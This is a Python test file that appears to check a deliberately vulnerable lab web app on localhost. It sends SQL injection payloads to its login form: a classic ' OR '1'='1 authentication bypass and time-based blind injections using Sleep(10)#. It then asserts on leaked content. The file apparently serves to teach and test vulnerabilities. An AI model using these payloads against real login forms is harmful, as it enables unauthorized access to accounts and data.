from bs4 import BeautifulSoup
import requests
import time
import sys

def test_classic_sql():
    time.sleep(30)          # Give Docker time to start up

    """
    Classic Sql injection Test
    """

    classic = requests.post("http://localhost:5001/login", {"username": "admin@user.com\' OR \'1\'=\'1", "password": ""}).text
    soup = BeautifulSoup(classic, "html.parser")
    text=soup.find_all(text=True)
    string = ""
    for x in text:
        string += str(x)
    text = string
    print(text)
    assert "GZDxKjvdZUA5u4tP" in text

def test_blind_sql_false():  
    """
    Blind Sql injection Test
    """
    classic = requests.post("http://localhost:5001/login", {"username": "admin@user.com\' and Sleep(10)#", "password": ""}).text
    soup = BeautifulSoup(classic, "html.parser")
    text=soup.find_all(text=True)
    string = ""
    for x in text:
        string += str(x)
    text = string
    print(text)
    assert "No record" in text

def test_blind_sql_true():
    """
    Blind Sql injection Test
    """
    classic = requests.post("http://localhost:5001/login", {"username": "admin@user.com\' or Sleep(10)#", "password": ""}).text
    soup = BeautifulSoup(classic, "html.parser")
    text=soup.find_all(text=True)
    string = ""
    for x in text:
        string += str(x)
    text = string
    print(text)
    assert "password" in text

if __name__ == '__main__':
    test_classic_sql()
    test_blind_sql_true()
    test_blind_sql_false()
